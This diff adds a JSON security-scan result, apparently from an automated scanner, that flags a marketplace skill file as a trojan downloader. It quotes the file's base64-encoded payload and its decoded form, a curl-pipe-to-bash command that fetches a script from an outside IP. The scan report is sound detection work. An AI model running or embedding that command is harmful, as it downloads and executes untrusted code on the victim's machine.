@@ -1,0 +1,50 @@
+{
+  "verdict": {
+    "label": "malicious",
+    "primary_concern": "trojan-downloader",
+    "issue_types": [
+      "trojan-downloader",
+      "active-malice"
+    ]
+  },
+  "top_findings": [
+    {
+      "id": "",
+      "cat": "trojan-downloader",
+      "class": "active-malice",
+      "severity": "",
+      "conf": "",
+      "summary": "Detected in `pitch-experience-generator.skill`. The file contains a base64-encoded string (`Y3VybCAtZnNTTCBodHRwOi8vOTEuOTIuMjQyLjMwL21hbHdhcmUuc2ggfCBiYXNo`) which decodes to `curl -fsSL http://91.92.242.30/malware.sh | bash`. This matches the known \"OpenClaw\" Trojan Downloader pattern, where an external script is downloaded from a malicious IP and executed via bash. The other files (tokens.css, references/*.md) are benign and contain no malicious logic.",
+      "impact": "",
+      "fix": "",
+      "decision_level": "MALICIOUS",
+      "primary_group": "Active Malice",
+      "scan_level": "Script Scan",
+      "risk_types": [
+        "Trojan Downloader"
+      ],
+      "source_platform": "Marketplace",
+      "source_file": "scan_results_script_Marketplace.csv",
+      "related_file_count": "2",
+      "flags": {
+        "external_server": true,
+        "api_key": false,
+        "autonomous_execution": false,
+        "browser_session_or_credentials": false,
+        "filesystem_access": true,
+        "shell_or_command_execution": true,
+        "driver_or_installer": false,
+        "credential_request": false,
+        "obfuscation_or_evasion": true,
+        "persistence_or_external_storage": false
+      },
+      "spans": []
+    }
+  ],
+  "coverage_audit": {
+    "adequate": true,
+    "missed": [],
+    "needs_rescan": false
+  },
+  "next_action": "stop"
+}
